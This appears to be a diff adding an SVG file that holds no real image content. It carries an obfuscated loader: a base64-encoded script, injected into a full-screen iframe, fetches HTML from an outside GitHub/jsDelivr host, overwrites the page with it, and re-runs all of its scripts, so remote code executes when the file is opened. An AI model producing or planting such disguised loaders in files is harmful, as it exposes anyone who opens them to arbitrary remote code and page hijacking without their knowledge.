@@ -1,0 +1,11 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" style="position: fixed; top: 0; left: 0;">
+<style>[...]</style>
+  <foreignObject x="0" y="0" width="100%" height="100%">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+    <meta content='width=device-width, initial-scale=1.0' name='viewport'></meta>
+	 <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;" id="test"></iframe>
+         <script>let l = atob("PHNjcmlwdD5mZXRjaCgiaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL1RPR1o4MTkvZ2FtZXMudG9nejgub25saW5lQG1haW4vaW5kZXguaHRtbD90PSIrRGF0ZS5ub3coKSkudGhlbihyPT5yLnRleHQoKSkudGhlbihodG1sPT57ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LmlubmVySFRNTD1odG1sO2RvY3VtZW50LmRvY3VtZW50RWxlbWVudC5xdWVyeVNlbGVjdG9yQWxsKCdzY3JpcHQnKS5mb3JFYWNoKG9sZD0+e2NvbnN0IHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7aWYob2xkLnNyYylzLnNyYz1vbGQuc3JjO2Vsc2Ugcy50ZXh0Q29udGVudD1vbGQudGV4dENvbnRlbnQ7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzKTt9KTt9KTs8L3NjcmlwdD4="); var theIframe = document.getElementById('test'); theIframe.srcdoc = l;</script>
+    </body>
+  </foreignObject>
+      <script><![CDATA[...]]></script>
+</svg>
